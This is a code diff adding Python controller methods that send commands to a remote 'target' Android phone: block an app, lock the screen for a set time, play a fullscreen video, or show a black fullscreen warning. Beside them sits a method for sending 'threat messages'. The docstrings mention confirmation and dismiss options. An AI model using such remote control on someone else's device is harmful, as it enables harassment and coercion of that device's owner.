@@ -564,6 +564,104 @@ class PhoneController:
               f"({'executing immediately' if delay == 0 else 'scheduled on the device'}).")
         return True
 
+    def _block_app(self):
+        """Ask for an app's package name and send a block request to the target.
+
+        The target prompts the user to confirm the lock before it is applied.
+        Returns True if the request was sent (a reply is expected), False on
+        invalid input (no request was sent).
+        """
+        print("Enter the app's package name (technical name, NOT the display name).")
+        print("  - Find it on the device: Settings > Apps > tap the app > "
+              "App info > the package is shown under the app name.")
+        print("  - Example: com.google.android.youtube (YouTube), "
+              "org.telegram.messenger (Telegram), com.dts.freefireth (Free Fire).")
+        package = input("App package name: ").strip()
+        if not package:
+            print("Result: Error - package name is empty.")
+            return False
+        self.send_command(f"block_app:{package}")
+        return True
+
+    def _block_screen(self):
+        """Send a temporary fullscreen screen-lock request to the target.
+
+        The target locks the screen for the requested duration and releases it
+        automatically. Returns True if the command was sent, False on invalid
+        input.
+        """
+        print("Selected: Block screen (temporary fullscreen lock).")
+        print("  - The lock auto-expires after the requested duration (1-86400 seconds).")
+        print("  - The user can still press the back/home overview system keys "
+              "on most devices; the block is not a persistent lockdown.")
+        duration_str = input("Duration in seconds: ").strip()
+        duration = _parse_duration(duration_str)
+        if duration is None:
+            print("Result: Error - duration must be an integer between 1 and 86400 seconds.")
+            return False
+        self.send_command(f"block_screen:{duration}")
+        print(f"Locking the target screen for {duration} seconds...")
+        return True
+
+    def _play_video(self):
+        """Send a fullscreen video request to the target for playback.
+
+        Uses the video library: any mp4 file named video_<n>.mp4 inside
+        app/src/main/res/raw. Returns True if the command was sent (a reply is
+        expected and read by the caller), False if the user went back or the
+        library is empty (no command was sent).
+        """
+        print("\n--- Fullscreen Video Library ---")
+        library = scan_video_library()
+        if not library:
+            print("No videos found.")
+            print("Result: Error - add a video named video_<n>.mp4 to "
+                  "app/src/main/res/raw (e.g. video_1.mp4) and rebuild the app "
+                  "to expand the library.")
+            return False
+        for vid, filename in library:
+            print(f"{vid}. {filename}")
+        print("0. Back")
+
+        choice = input("Choose a video (0 to go back): ").strip()
+        if choice == "0":
+            return False
+
+        video_id = _parse_int_in_range(choice, 1, 10_000_000)
+        if video_id is None:
+            print("Result: Error - choose a numeric video id from the list.")
+            return False
+
+        matching = [filename for vid, filename in library if vid == video_id]
+        if not matching:
+            print(f"Result: Error - video id {video_id} is not in the library. "
+                  f"Available: {', '.join(str(v) for v, _ in library) or 'none'}.")
+            return False
+
+        send_message(self.client_socket, f"play_video:{video_id}")
+        print(f"Sending fullscreen video {matching[0]} (id {video_id})...")
+        return True
+
+    def _serious_warning(self):
+        """Send a fullscreen serious warning message to the target.
+
+        The target shows a black fullscreen warning (up to 2000 characters -
+        an informative alert for your own device, e.g. a real battery/thermal
+        warning). Returns True if the command was sent (a reply is expected),
+        False on invalid input.
+        """
+        print("Selected: Show serious warning message (fullscreen, black screen).")
+        print("  - Maximum 2000 characters.")
+        print("  - The user can dismiss it with the close button; it is not "
+              "a locked screen.")
+        text = input("Warning text: ").strip()
+        if not text:
+            print("Result: Error - warning text is empty.")
+            return False
+        self.send_command(f"show_serious_warning:{text}")
+        print("Sending serious warning to the target...")
+        return True
+
     def _message_dashboard(self):
         """Send a predefined or custom threat message to display on the device.
 
